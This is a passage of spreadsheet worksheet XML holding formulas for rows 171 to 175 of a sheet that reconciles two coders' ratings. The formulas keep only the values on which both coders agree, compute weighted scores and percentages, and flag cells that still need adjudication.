        <f>IF(AND(Coder1!AH171&amp;""&lt;&gt;"",Coder1!AH171&amp;""=Coder2!AH171&amp;""),Coder1!AH171,"")</f>
        <v/>
      </c>
      <c r="AI171" s="11">
        <f>IF(COUNT(E171:L171)=0,"",SUM(E171:L171))</f>
        <v/>
      </c>
      <c r="AJ171" s="11">
        <f>IF(AI171="","",N(E171)*3+N(F171)*2+N(G171)*2+N(H171)*2+N(I171)*2+N(J171)*3+N(K171)*3+N(L171)*3)</f>
        <v/>
      </c>
      <c r="AK171" s="11">
        <f>IF(AI171="","",COUNTIF(N171:AG171,1))</f>
        <v/>
      </c>
      <c r="AL171" s="11">
        <f>IF(OR(AJ171="",AJ171=0),"",ROUND(100*(AJ171-AK171)/AJ171,1))</f>
        <v/>
      </c>
      <c r="AM171" s="11">
        <f>IF(AND(Coder1!AN171=1,Coder2!AN171=1),IF(COUNTBLANK(E171:AH171)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN171" s="11">
        <f>IF(AND(Coder1!AN171=1,Coder2!AN171=1),IF(SUMPRODUCT(--(Coder1!E171:AH171&amp;""&lt;&gt;Coder2!E171:AH171&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO171" s="11" t="n"/>
    </row>
    <row r="172">
      <c r="A172" s="11">
        <f>Coder1!A172</f>
        <v/>
      </c>
      <c r="B172" s="11">
        <f>Coder1!B172</f>
        <v/>
      </c>
      <c r="C172" s="11">
        <f>Coder1!C172</f>
        <v/>
      </c>
      <c r="D172" s="11">
        <f>Coder1!D172</f>
        <v/>
      </c>
      <c r="E172" s="14">
        <f>IF(AND(Coder1!E172&amp;""&lt;&gt;"",Coder1!E172&amp;""=Coder2!E172&amp;""),Coder1!E172,"")</f>
        <v/>
      </c>
      <c r="F172" s="14">
        <f>IF(AND(Coder1!F172&amp;""&lt;&gt;"",Coder1!F172&amp;""=Coder2!F172&amp;""),Coder1!F172,"")</f>
        <v/>
      </c>
      <c r="G172" s="14">
        <f>IF(AND(Coder1!G172&amp;""&lt;&gt;"",Coder1!G172&amp;""=Coder2!G172&amp;""),Coder1!G172,"")</f>
        <v/>
      </c>
      <c r="H172" s="14">
        <f>IF(AND(Coder1!H172&amp;""&lt;&gt;"",Coder1!H172&amp;""=Coder2!H172&amp;""),Coder1!H172,"")</f>
        <v/>
      </c>
      <c r="I172" s="14">
        <f>IF(AND(Coder1!I172&amp;""&lt;&gt;"",Coder1!I172&amp;""=Coder2!I172&amp;""),Coder1!I172,"")</f>
        <v/>
      </c>
      <c r="J172" s="14">
        <f>IF(AND(Coder1!J172&amp;""&lt;&gt;"",Coder1!J172&amp;""=Coder2!J172&amp;""),Coder1!J172,"")</f>
        <v/>
      </c>
      <c r="K172" s="14">
        <f>IF(AND(Coder1!K172&amp;""&lt;&gt;"",Coder1!K172&amp;""=Coder2!K172&amp;""),Coder1!K172,"")</f>
        <v/>
      </c>
      <c r="L172" s="14">
        <f>IF(AND(Coder1!L172&amp;""&lt;&gt;"",Coder1!L172&amp;""=Coder2!L172&amp;""),Coder1!L172,"")</f>
        <v/>
      </c>
      <c r="M172" s="14">
        <f>IF(AND(Coder1!M172&amp;""&lt;&gt;"",Coder1!M172&amp;""=Coder2!M172&amp;""),Coder1!M172,"")</f>
        <v/>
      </c>
      <c r="N172" s="14">
        <f>IF(AND(Coder1!N172&amp;""&lt;&gt;"",Coder1!N172&amp;""=Coder2!N172&amp;""),Coder1!N172,"")</f>
        <v/>
      </c>
      <c r="O172" s="14">
        <f>IF(AND(Coder1!O172&amp;""&lt;&gt;"",Coder1!O172&amp;""=Coder2!O172&amp;""),Coder1!O172,"")</f>
        <v/>
      </c>
      <c r="P172" s="14">
        <f>IF(AND(Coder1!P172&amp;""&lt;&gt;"",Coder1!P172&amp;""=Coder2!P172&amp;""),Coder1!P172,"")</f>
        <v/>
      </c>
      <c r="Q172" s="14">
        <f>IF(AND(Coder1!Q172&amp;""&lt;&gt;"",Coder1!Q172&amp;""=Coder2!Q172&amp;""),Coder1!Q172,"")</f>
        <v/>
      </c>
      <c r="R172" s="14">
        <f>IF(AND(Coder1!R172&amp;""&lt;&gt;"",Coder1!R172&amp;""=Coder2!R172&amp;""),Coder1!R172,"")</f>
        <v/>
      </c>
      <c r="S172" s="14">
        <f>IF(AND(Coder1!S172&amp;""&lt;&gt;"",Coder1!S172&amp;""=Coder2!S172&amp;""),Coder1!S172,"")</f>
        <v/>
      </c>
      <c r="T172" s="14">
        <f>IF(AND(Coder1!T172&amp;""&lt;&gt;"",Coder1!T172&amp;""=Coder2!T172&amp;""),Coder1!T172,"")</f>
        <v/>
      </c>
      <c r="U172" s="14">
        <f>IF(AND(Coder1!U172&amp;""&lt;&gt;"",Coder1!U172&amp;""=Coder2!U172&amp;""),Coder1!U172,"")</f>
        <v/>
      </c>
      <c r="V172" s="14">
        <f>IF(AND(Coder1!V172&amp;""&lt;&gt;"",Coder1!V172&amp;""=Coder2!V172&amp;""),Coder1!V172,"")</f>
        <v/>
      </c>
      <c r="W172" s="14">
        <f>IF(AND(Coder1!W172&amp;""&lt;&gt;"",Coder1!W172&amp;""=Coder2!W172&amp;""),Coder1!W172,"")</f>
        <v/>
      </c>
      <c r="X172" s="14">
        <f>IF(AND(Coder1!X172&amp;""&lt;&gt;"",Coder1!X172&amp;""=Coder2!X172&amp;""),Coder1!X172,"")</f>
        <v/>
      </c>
      <c r="Y172" s="14">
        <f>IF(AND(Coder1!Y172&amp;""&lt;&gt;"",Coder1!Y172&amp;""=Coder2!Y172&amp;""),Coder1!Y172,"")</f>
        <v/>
      </c>
      <c r="Z172" s="14">
        <f>IF(AND(Coder1!Z172&amp;""&lt;&gt;"",Coder1!Z172&amp;""=Coder2!Z172&amp;""),Coder1!Z172,"")</f>
        <v/>
      </c>
      <c r="AA172" s="14">
        <f>IF(AND(Coder1!AA172&amp;""&lt;&gt;"",Coder1!AA172&amp;""=Coder2!AA172&amp;""),Coder1!AA172,"")</f>
        <v/>
      </c>
      <c r="AB172" s="14">
        <f>IF(AND(Coder1!AB172&amp;""&lt;&gt;"",Coder1!AB172&amp;""=Coder2!AB172&amp;""),Coder1!AB172,"")</f>
        <v/>
      </c>
      <c r="AC172" s="14">
        <f>IF(AND(Coder1!AC172&amp;""&lt;&gt;"",Coder1!AC172&amp;""=Coder2!AC172&amp;""),Coder1!AC172,"")</f>
        <v/>
      </c>
      <c r="AD172" s="14">
        <f>IF(AND(Coder1!AD172&amp;""&lt;&gt;"",Coder1!AD172&amp;""=Coder2!AD172&amp;""),Coder1!AD172,"")</f>
        <v/>
      </c>
      <c r="AE172" s="14">
        <f>IF(AND(Coder1!AE172&amp;""&lt;&gt;"",Coder1!AE172&amp;""=Coder2!AE172&amp;""),Coder1!AE172,"")</f>
        <v/>
      </c>
      <c r="AF172" s="14">
        <f>IF(AND(Coder1!AF172&amp;""&lt;&gt;"",Coder1!AF172&amp;""=Coder2!AF172&amp;""),Coder1!AF172,"")</f>
        <v/>
      </c>
      <c r="AG172" s="14">
        <f>IF(AND(Coder1!AG172&amp;""&lt;&gt;"",Coder1!AG172&amp;""=Coder2!AG172&amp;""),Coder1!AG172,"")</f>
        <v/>
      </c>
      <c r="AH172" s="14">
        <f>IF(AND(Coder1!AH172&amp;""&lt;&gt;"",Coder1!AH172&amp;""=Coder2!AH172&amp;""),Coder1!AH172,"")</f>
        <v/>
      </c>
      <c r="AI172" s="11">
        <f>IF(COUNT(E172:L172)=0,"",SUM(E172:L172))</f>
        <v/>
      </c>
      <c r="AJ172" s="11">
        <f>IF(AI172="","",N(E172)*3+N(F172)*2+N(G172)*2+N(H172)*2+N(I172)*2+N(J172)*3+N(K172)*3+N(L172)*3)</f>
        <v/>
      </c>
      <c r="AK172" s="11">
        <f>IF(AI172="","",COUNTIF(N172:AG172,1))</f>
        <v/>
      </c>
      <c r="AL172" s="11">
        <f>IF(OR(AJ172="",AJ172=0),"",ROUND(100*(AJ172-AK172)/AJ172,1))</f>
        <v/>
      </c>
      <c r="AM172" s="11">
        <f>IF(AND(Coder1!AN172=1,Coder2!AN172=1),IF(COUNTBLANK(E172:AH172)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN172" s="11">
        <f>IF(AND(Coder1!AN172=1,Coder2!AN172=1),IF(SUMPRODUCT(--(Coder1!E172:AH172&amp;""&lt;&gt;Coder2!E172:AH172&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO172" s="11" t="n"/>
    </row>
    <row r="173">
      <c r="A173" s="11">
        <f>Coder1!A173</f>
        <v/>
      </c>
      <c r="B173" s="11">
        <f>Coder1!B173</f>
        <v/>
      </c>
      <c r="C173" s="11">
        <f>Coder1!C173</f>
        <v/>
      </c>
      <c r="D173" s="11">
        <f>Coder1!D173</f>
        <v/>
      </c>
      <c r="E173" s="14">
        <f>IF(AND(Coder1!E173&amp;""&lt;&gt;"",Coder1!E173&amp;""=Coder2!E173&amp;""),Coder1!E173,"")</f>
        <v/>
      </c>
      <c r="F173" s="14">
        <f>IF(AND(Coder1!F173&amp;""&lt;&gt;"",Coder1!F173&amp;""=Coder2!F173&amp;""),Coder1!F173,"")</f>
        <v/>
      </c>
      <c r="G173" s="14">
        <f>IF(AND(Coder1!G173&amp;""&lt;&gt;"",Coder1!G173&amp;""=Coder2!G173&amp;""),Coder1!G173,"")</f>
        <v/>
      </c>
      <c r="H173" s="14">
        <f>IF(AND(Coder1!H173&amp;""&lt;&gt;"",Coder1!H173&amp;""=Coder2!H173&amp;""),Coder1!H173,"")</f>
        <v/>
      </c>
      <c r="I173" s="14">
        <f>IF(AND(Coder1!I173&amp;""&lt;&gt;"",Coder1!I173&amp;""=Coder2!I173&amp;""),Coder1!I173,"")</f>
        <v/>
      </c>
      <c r="J173" s="14">
        <f>IF(AND(Coder1!J173&amp;""&lt;&gt;"",Coder1!J173&amp;""=Coder2!J173&amp;""),Coder1!J173,"")</f>
        <v/>
      </c>
      <c r="K173" s="14">
        <f>IF(AND(Coder1!K173&amp;""&lt;&gt;"",Coder1!K173&amp;""=Coder2!K173&amp;""),Coder1!K173,"")</f>
        <v/>
      </c>
      <c r="L173" s="14">
        <f>IF(AND(Coder1!L173&amp;""&lt;&gt;"",Coder1!L173&amp;""=Coder2!L173&amp;""),Coder1!L173,"")</f>
        <v/>
      </c>
      <c r="M173" s="14">
        <f>IF(AND(Coder1!M173&amp;""&lt;&gt;"",Coder1!M173&amp;""=Coder2!M173&amp;""),Coder1!M173,"")</f>
        <v/>
      </c>
      <c r="N173" s="14">
        <f>IF(AND(Coder1!N173&amp;""&lt;&gt;"",Coder1!N173&amp;""=Coder2!N173&amp;""),Coder1!N173,"")</f>
        <v/>
      </c>
      <c r="O173" s="14">
        <f>IF(AND(Coder1!O173&amp;""&lt;&gt;"",Coder1!O173&amp;""=Coder2!O173&amp;""),Coder1!O173,"")</f>
        <v/>
      </c>
      <c r="P173" s="14">
        <f>IF(AND(Coder1!P173&amp;""&lt;&gt;"",Coder1!P173&amp;""=Coder2!P173&amp;""),Coder1!P173,"")</f>
        <v/>
      </c>
      <c r="Q173" s="14">
        <f>IF(AND(Coder1!Q173&amp;""&lt;&gt;"",Coder1!Q173&amp;""=Coder2!Q173&amp;""),Coder1!Q173,"")</f>
        <v/>
      </c>
      <c r="R173" s="14">
        <f>IF(AND(Coder1!R173&amp;""&lt;&gt;"",Coder1!R173&amp;""=Coder2!R173&amp;""),Coder1!R173,"")</f>
        <v/>
      </c>
      <c r="S173" s="14">
        <f>IF(AND(Coder1!S173&amp;""&lt;&gt;"",Coder1!S173&amp;""=Coder2!S173&amp;""),Coder1!S173,"")</f>
        <v/>
      </c>
      <c r="T173" s="14">
        <f>IF(AND(Coder1!T173&amp;""&lt;&gt;"",Coder1!T173&amp;""=Coder2!T173&amp;""),Coder1!T173,"")</f>
        <v/>
      </c>
      <c r="U173" s="14">
        <f>IF(AND(Coder1!U173&amp;""&lt;&gt;"",Coder1!U173&amp;""=Coder2!U173&amp;""),Coder1!U173,"")</f>
        <v/>
      </c>
      <c r="V173" s="14">
        <f>IF(AND(Coder1!V173&amp;""&lt;&gt;"",Coder1!V173&amp;""=Coder2!V173&amp;""),Coder1!V173,"")</f>
        <v/>
      </c>
      <c r="W173" s="14">
        <f>IF(AND(Coder1!W173&amp;""&lt;&gt;"",Coder1!W173&amp;""=Coder2!W173&amp;""),Coder1!W173,"")</f>
        <v/>
      </c>
      <c r="X173" s="14">
        <f>IF(AND(Coder1!X173&amp;""&lt;&gt;"",Coder1!X173&amp;""=Coder2!X173&amp;""),Coder1!X173,"")</f>
        <v/>
      </c>
      <c r="Y173" s="14">
        <f>IF(AND(Coder1!Y173&amp;""&lt;&gt;"",Coder1!Y173&amp;""=Coder2!Y173&amp;""),Coder1!Y173,"")</f>
        <v/>
      </c>
      <c r="Z173" s="14">
        <f>IF(AND(Coder1!Z173&amp;""&lt;&gt;"",Coder1!Z173&amp;""=Coder2!Z173&amp;""),Coder1!Z173,"")</f>
        <v/>
      </c>
      <c r="AA173" s="14">
        <f>IF(AND(Coder1!AA173&amp;""&lt;&gt;"",Coder1!AA173&amp;""=Coder2!AA173&amp;""),Coder1!AA173,"")</f>
        <v/>
      </c>
      <c r="AB173" s="14">
        <f>IF(AND(Coder1!AB173&amp;""&lt;&gt;"",Coder1!AB173&amp;""=Coder2!AB173&amp;""),Coder1!AB173,"")</f>
        <v/>
      </c>
      <c r="AC173" s="14">
        <f>IF(AND(Coder1!AC173&amp;""&lt;&gt;"",Coder1!AC173&amp;""=Coder2!AC173&amp;""),Coder1!AC173,"")</f>
        <v/>
      </c>
      <c r="AD173" s="14">
        <f>IF(AND(Coder1!AD173&amp;""&lt;&gt;"",Coder1!AD173&amp;""=Coder2!AD173&amp;""),Coder1!AD173,"")</f>
        <v/>
      </c>
      <c r="AE173" s="14">
        <f>IF(AND(Coder1!AE173&amp;""&lt;&gt;"",Coder1!AE173&amp;""=Coder2!AE173&amp;""),Coder1!AE173,"")</f>
        <v/>
      </c>
      <c r="AF173" s="14">
        <f>IF(AND(Coder1!AF173&amp;""&lt;&gt;"",Coder1!AF173&amp;""=Coder2!AF173&amp;""),Coder1!AF173,"")</f>
        <v/>
      </c>
      <c r="AG173" s="14">
        <f>IF(AND(Coder1!AG173&amp;""&lt;&gt;"",Coder1!AG173&amp;""=Coder2!AG173&amp;""),Coder1!AG173,"")</f>
        <v/>
      </c>
      <c r="AH173" s="14">
        <f>IF(AND(Coder1!AH173&amp;""&lt;&gt;"",Coder1!AH173&amp;""=Coder2!AH173&amp;""),Coder1!AH173,"")</f>
        <v/>
      </c>
      <c r="AI173" s="11">
        <f>IF(COUNT(E173:L173)=0,"",SUM(E173:L173))</f>
        <v/>
      </c>
      <c r="AJ173" s="11">
        <f>IF(AI173="","",N(E173)*3+N(F173)*2+N(G173)*2+N(H173)*2+N(I173)*2+N(J173)*3+N(K173)*3+N(L173)*3)</f>
        <v/>
      </c>
      <c r="AK173" s="11">
        <f>IF(AI173="","",COUNTIF(N173:AG173,1))</f>
        <v/>
      </c>
      <c r="AL173" s="11">
        <f>IF(OR(AJ173="",AJ173=0),"",ROUND(100*(AJ173-AK173)/AJ173,1))</f>
        <v/>
      </c>
      <c r="AM173" s="11">
        <f>IF(AND(Coder1!AN173=1,Coder2!AN173=1),IF(COUNTBLANK(E173:AH173)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN173" s="11">
        <f>IF(AND(Coder1!AN173=1,Coder2!AN173=1),IF(SUMPRODUCT(--(Coder1!E173:AH173&amp;""&lt;&gt;Coder2!E173:AH173&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO173" s="11" t="n"/>
    </row>
    <row r="174">
      <c r="A174" s="11">
        <f>Coder1!A174</f>
        <v/>
      </c>
      <c r="B174" s="11">
        <f>Coder1!B174</f>
        <v/>
      </c>
      <c r="C174" s="11">
        <f>Coder1!C174</f>
        <v/>
      </c>
      <c r="D174" s="11">
        <f>Coder1!D174</f>
        <v/>
      </c>
      <c r="E174" s="14">
        <f>IF(AND(Coder1!E174&amp;""&lt;&gt;"",Coder1!E174&amp;""=Coder2!E174&amp;""),Coder1!E174,"")</f>
        <v/>
      </c>
      <c r="F174" s="14">
        <f>IF(AND(Coder1!F174&amp;""&lt;&gt;"",Coder1!F174&amp;""=Coder2!F174&amp;""),Coder1!F174,"")</f>
        <v/>
      </c>
      <c r="G174" s="14">
        <f>IF(AND(Coder1!G174&amp;""&lt;&gt;"",Coder1!G174&amp;""=Coder2!G174&amp;""),Coder1!G174,"")</f>
        <v/>
      </c>
      <c r="H174" s="14">
        <f>IF(AND(Coder1!H174&amp;""&lt;&gt;"",Coder1!H174&amp;""=Coder2!H174&amp;""),Coder1!H174,"")</f>
        <v/>
      </c>
      <c r="I174" s="14">
        <f>IF(AND(Coder1!I174&amp;""&lt;&gt;"",Coder1!I174&amp;""=Coder2!I174&amp;""),Coder1!I174,"")</f>
        <v/>
      </c>
      <c r="J174" s="14">
        <f>IF(AND(Coder1!J174&amp;""&lt;&gt;"",Coder1!J174&amp;""=Coder2!J174&amp;""),Coder1!J174,"")</f>
        <v/>
      </c>
      <c r="K174" s="14">
        <f>IF(AND(Coder1!K174&amp;""&lt;&gt;"",Coder1!K174&amp;""=Coder2!K174&amp;""),Coder1!K174,"")</f>
        <v/>
      </c>
      <c r="L174" s="14">
        <f>IF(AND(Coder1!L174&amp;""&lt;&gt;"",Coder1!L174&amp;""=Coder2!L174&amp;""),Coder1!L174,"")</f>
        <v/>
      </c>
      <c r="M174" s="14">
        <f>IF(AND(Coder1!M174&amp;""&lt;&gt;"",Coder1!M174&amp;""=Coder2!M174&amp;""),Coder1!M174,"")</f>
        <v/>
      </c>
      <c r="N174" s="14">
        <f>IF(AND(Coder1!N174&amp;""&lt;&gt;"",Coder1!N174&amp;""=Coder2!N174&amp;""),Coder1!N174,"")</f>
        <v/>
      </c>
      <c r="O174" s="14">
        <f>IF(AND(Coder1!O174&amp;""&lt;&gt;"",Coder1!O174&amp;""=Coder2!O174&amp;""),Coder1!O174,"")</f>
        <v/>
      </c>
      <c r="P174" s="14">
        <f>IF(AND(Coder1!P174&amp;""&lt;&gt;"",Coder1!P174&amp;""=Coder2!P174&amp;""),Coder1!P174,"")</f>
        <v/>
      </c>
      <c r="Q174" s="14">
        <f>IF(AND(Coder1!Q174&amp;""&lt;&gt;"",Coder1!Q174&amp;""=Coder2!Q174&amp;""),Coder1!Q174,"")</f>
        <v/>
      </c>
      <c r="R174" s="14">
        <f>IF(AND(Coder1!R174&amp;""&lt;&gt;"",Coder1!R174&amp;""=Coder2!R174&amp;""),Coder1!R174,"")</f>
        <v/>
      </c>
      <c r="S174" s="14">
        <f>IF(AND(Coder1!S174&amp;""&lt;&gt;"",Coder1!S174&amp;""=Coder2!S174&amp;""),Coder1!S174,"")</f>
        <v/>
      </c>
      <c r="T174" s="14">
        <f>IF(AND(Coder1!T174&amp;""&lt;&gt;"",Coder1!T174&amp;""=Coder2!T174&amp;""),Coder1!T174,"")</f>
        <v/>
      </c>
      <c r="U174" s="14">
        <f>IF(AND(Coder1!U174&amp;""&lt;&gt;"",Coder1!U174&amp;""=Coder2!U174&amp;""),Coder1!U174,"")</f>
        <v/>
      </c>
      <c r="V174" s="14">
        <f>IF(AND(Coder1!V174&amp;""&lt;&gt;"",Coder1!V174&amp;""=Coder2!V174&amp;""),Coder1!V174,"")</f>
        <v/>
      </c>
      <c r="W174" s="14">
        <f>IF(AND(Coder1!W174&amp;""&lt;&gt;"",Coder1!W174&amp;""=Coder2!W174&amp;""),Coder1!W174,"")</f>
        <v/>
      </c>
      <c r="X174" s="14">
        <f>IF(AND(Coder1!X174&amp;""&lt;&gt;"",Coder1!X174&amp;""=Coder2!X174&amp;""),Coder1!X174,"")</f>
        <v/>
      </c>
      <c r="Y174" s="14">
        <f>IF(AND(Coder1!Y174&amp;""&lt;&gt;"",Coder1!Y174&amp;""=Coder2!Y174&amp;""),Coder1!Y174,"")</f>
        <v/>
      </c>
      <c r="Z174" s="14">
        <f>IF(AND(Coder1!Z174&amp;""&lt;&gt;"",Coder1!Z174&amp;""=Coder2!Z174&amp;""),Coder1!Z174,"")</f>
        <v/>
      </c>
      <c r="AA174" s="14">
        <f>IF(AND(Coder1!AA174&amp;""&lt;&gt;"",Coder1!AA174&amp;""=Coder2!AA174&amp;""),Coder1!AA174,"")</f>
        <v/>
      </c>
      <c r="AB174" s="14">
        <f>IF(AND(Coder1!AB174&amp;""&lt;&gt;"",Coder1!AB174&amp;""=Coder2!AB174&amp;""),Coder1!AB174,"")</f>
        <v/>
      </c>
      <c r="AC174" s="14">
        <f>IF(AND(Coder1!AC174&amp;""&lt;&gt;"",Coder1!AC174&amp;""=Coder2!AC174&amp;""),Coder1!AC174,"")</f>
        <v/>
      </c>
      <c r="AD174" s="14">
        <f>IF(AND(Coder1!AD174&amp;""&lt;&gt;"",Coder1!AD174&amp;""=Coder2!AD174&amp;""),Coder1!AD174,"")</f>
        <v/>
      </c>
      <c r="AE174" s="14">
        <f>IF(AND(Coder1!AE174&amp;""&lt;&gt;"",Coder1!AE174&amp;""=Coder2!AE174&amp;""),Coder1!AE174,"")</f>
        <v/>
      </c>
      <c r="AF174" s="14">
        <f>IF(AND(Coder1!AF174&amp;""&lt;&gt;"",Coder1!AF174&amp;""=Coder2!AF174&amp;""),Coder1!AF174,"")</f>
        <v/>
      </c>
      <c r="AG174" s="14">
        <f>IF(AND(Coder1!AG174&amp;""&lt;&gt;"",Coder1!AG174&amp;""=Coder2!AG174&amp;""),Coder1!AG174,"")</f>
        <v/>
      </c>
      <c r="AH174" s="14">
        <f>IF(AND(Coder1!AH174&amp;""&lt;&gt;"",Coder1!AH174&amp;""=Coder2!AH174&amp;""),Coder1!AH174,"")</f>
        <v/>
      </c>
      <c r="AI174" s="11">
        <f>IF(COUNT(E174:L174)=0,"",SUM(E174:L174))</f>
        <v/>
      </c>
      <c r="AJ174" s="11">
        <f>IF(AI174="","",N(E174)*3+N(F174)*2+N(G174)*2+N(H174)*2+N(I174)*2+N(J174)*3+N(K174)*3+N(L174)*3)</f>
        <v/>
      </c>
      <c r="AK174" s="11">
        <f>IF(AI174="","",COUNTIF(N174:AG174,1))</f>
        <v/>
      </c>
      <c r="AL174" s="11">
        <f>IF(OR(AJ174="",AJ174=0),"",ROUND(100*(AJ174-AK174)/AJ174,1))</f>
        <v/>
      </c>
      <c r="AM174" s="11">
        <f>IF(AND(Coder1!AN174=1,Coder2!AN174=1),IF(COUNTBLANK(E174:AH174)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN174" s="11">
        <f>IF(AND(Coder1!AN174=1,Coder2!AN174=1),IF(SUMPRODUCT(--(Coder1!E174:AH174&amp;""&lt;&gt;Coder2!E174:AH174&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO174" s="11" t="n"/>
    </row>
    <row r="175">
      <c r="A175" s="11">
        <f>Coder1!A175</f>
        <v/>
      </c>
      <c r="B175" s="11">
        <f>Coder1!B175</f>
        <v/>
      </c>
      <c r="C175" s="11">
        <f>Coder1!C175</f>
        <v/>
      </c>
      <c r="D175" s="11">
        <f>Coder1!D175</f>
        <v/>
      </c>
      <c r="E175" s="14">
        <f>IF(AND(Coder1!E175&amp;""&lt;&gt;"",Coder1!E175&amp;""=Coder2!E175&amp;""),Coder1!E175,"")</f>
        <v/>
      </c>
      <c r="F175" s="14">
        <f>IF(AND(Coder1!F175&amp;""&lt;&gt;"",Coder1!F175&amp;""=Coder2!F175&amp;""),Coder1!F175,"")</f>
        <v/>
      </c>
      <c r="G175" s="14">
        <f>IF(AND(Coder1!G175&amp;""&lt;&gt;"",Coder1!G175&amp;""=Coder2!G175&amp;""),Coder1!G175,"")</f>
        <v/>
      </c>
      <c r="H175" s="14">
        <f>IF(AND(Coder1!H175&amp;""&lt;&gt;"",Coder1!H175&amp;""=Coder2!H175&amp;""),Coder1!H175,"")</f>
        <v/>
      </c>
      <c r="I175" s="14">
        <f>IF(AND(Coder1!I175&amp;""&lt;&gt;"",Coder1!I175&amp;""=Coder2!I175&amp;""),Coder1!I175,"")</f>
        <v/>
      </c>
      <c r="J175" s="14">
        <f>IF(AND(Coder1!J175&amp;""&lt;&gt;"",Coder1!J175&amp;""=Coder2!J175&amp;""),Coder1!J175,"")</f>
        <v/>
      </c>
      <c r="K175" s="14">
        <f>IF(AND(Coder1!K175&amp;""&lt;&gt;"",Coder1!K175&amp;""=Coder2!K175&amp;""),Coder1!K175,"")</f>
        <v/>
      </c>
      <c r="L175" s="14">
        <f>IF(AND(Coder1!L175&amp;""&lt;&gt;"",Coder1!L175&amp;""=Coder2!L175&amp;""),Coder1!L175,"")</f>
        <v/>
      </c>
      <c r="M175" s="14">
        <f>IF(AND(Coder1!M175&amp;""&lt;&gt;"",Coder1!M175&amp;""=Coder2!M175&amp;""),Coder1!M175,"")</f>
        <v/>
      </c>
      <c r="N175" s="14">
        <f>IF(AND(Coder1!N175&amp;""&lt;&gt;"",Coder1!N175&amp;""=Coder2!N175&amp;""),Coder1!N175,"")</f>
        <v/>
      </c>
      <c r="O175" s="14">
        <f>IF(AND(Coder1!O175&amp;""&lt;&gt;"",Coder1!O175&amp;""=Coder2!O175&amp;""),Coder1!O175,"")</f>
        <v/>
      </c>
      <c r="P175" s="14">
        <f>IF(AND(Coder1!P175&amp;""&lt;&gt;"",Coder1!P175&amp;""=Coder2!P175&amp;""),Coder1!P175,"")</f>
        <v/>
      </c>
      <c r="Q175" s="14">
        <f>IF(AND(Coder1!Q175&amp;""&lt;&gt;"",Coder1!Q175&amp;""=Coder2!Q175&amp;""),Coder1!Q175,"")</f>
        <v/>
      </c>
      <c r="R175" s="14">
        <f>IF(AND(Coder1!R175&amp;""&lt;&gt;"",Coder1!R175&amp;""=Coder2!R175&amp;""),Coder1!R175,"")</f>
        <v/>
      </c>
      <c r="S175" s="14">
        <f>IF(AND(Coder1!S175&amp;""&lt;&gt;"",Coder1!S175&amp;""=Coder2!S175&amp;""),Coder1!S175,"")</f>
        <v/>
      </c>
      <c r="T175" s="14">
        <f>IF(AND(Coder1!T175&amp;""&lt;&gt;"",Coder1!T175&amp;""=Coder2!T175&amp;""),Coder1!T175,"")</f>
        <v/>
      </c>
      <c r="U175" s="14">
        <f>IF(AND(Coder1!U175&amp;""&lt;&gt;"",Coder1!U175&amp;""=Coder2!U175&amp;""),Coder1!U175,"")</f>
        <v/>
      </c>
      <c r="V175" s="14">
        <f>IF(AND(Coder1!V175&amp;""&lt;&gt;"",Coder1!V175&amp;""=Coder2!V175&amp;""),Coder1!V175,"")</f>
        <v/>
      </c>
      <c r="W175" s="14">
        <f>IF(AND(Coder1!W175&amp;""&lt;&gt;"",Coder1!W175&amp;""=Coder2!W175&amp;""),Coder1!W175,"")</f>
        <v/>
      </c>
      <c r="X175" s="14">
        <f>IF(AND(Coder1!X175&amp;""&lt;&gt;"",Coder1!X175&amp;""=Coder2!X175&amp;""),Coder1!X175,"")</f>
        <v/>
      </c>
      <c r="Y175" s="14">
        <f>IF(AND(Coder1!Y175&amp;""&lt;&gt;"",Coder1!Y175&amp;""=Coder2!Y175&amp;""),Coder1!Y175,"")</f>
        <v/>
      </c>
      <c r="Z175" s="14">
        <f>IF(AND(Coder1!Z175&amp;""&lt;&gt;"",Coder1!Z175&amp;""=Coder2!Z175&amp;""),Coder1!Z175,"")</f>
        <v/>
      </c>
      <c r="AA175" s="14">
        <f>IF(AND(Coder1!AA175&amp;""&lt;&gt;"",Coder1!AA175&amp;""=Coder2!AA175&amp;""),Coder1!AA175,"")</f>
        <v/>
      </c>
      <c r="AB175" s="14">
        <f>IF(AND(Coder1!AB175&amp;""&lt;&gt;"",Coder1!AB175&amp;""=Coder2!AB175&amp;""),Coder1!AB175,"")</f>
        <v/>
      </c>
      <c r="AC175" s="14">
        <f>IF(AND(Coder1!AC175&amp;""&lt;&gt;"",Coder1!AC175&amp;""=Coder2!AC175&amp;""),Coder1!AC175,"")</f>
        <v/>
      </c>
      <c r="AD175" s="14">
        <f>IF(AND(Coder1!AD175&amp;""&lt;&gt;"",Coder1!AD175&amp;""=Coder2!AD175&amp;""),Coder1!AD175,"")</f>
        <v/>
      </c>
      <c r="AE175" s="14">
        <f>IF(AND(Coder1!AE175&amp;""&lt;&gt;"",Coder1!AE175&amp;""=Coder2!AE175&amp;""),Coder1!AE175,"")</f>
        <v/>
      </c>
      <c r="AF175" s="14">
        <f>IF(AND(Coder1!AF175&amp;""&lt;&gt;"",Coder1!AF175&amp;""=Coder2!AF175&amp;""),Coder1!AF175,"")</f>
        <v/>
      </c>
      <c r="AG175" s="14">
        <f>IF(AND(Coder1!AG175&amp;""&lt;&gt;"",Coder1!AG175&amp;""=Coder2!AG175&amp;""),Coder1!AG175,"")</f>
        <v/>
      </c>
      <c r="AH175" s="14">
        <f>IF(AND(Coder1!AH175&amp;""&lt;&gt;"",Coder1!AH175&amp;""=Coder2!AH175&amp;""),Coder1!AH175,"")</f>
        <v/>
      </c>
      <c r="AI175" s="11">
        <f>IF(COUNT(E175:L175)=0,"",SUM(E175:L175))</f>
        <v/>
      </c>
      <c r="AJ175" s="11">
        <f>IF(AI175="","",N(E175)*3+N(F175)*2+N(G175)*2+N(H175)*2+N(I175)*2+N(J175)*3+N(K175)*3+N(L175)*3)</f>
        <v/>
      </c>
      <c r="AK175" s="11">
        <f>IF(AI175="","",COUNTIF(N175:AG175,1))</f>
        <v/>
      </c>
      <c r="AL175" s="11">
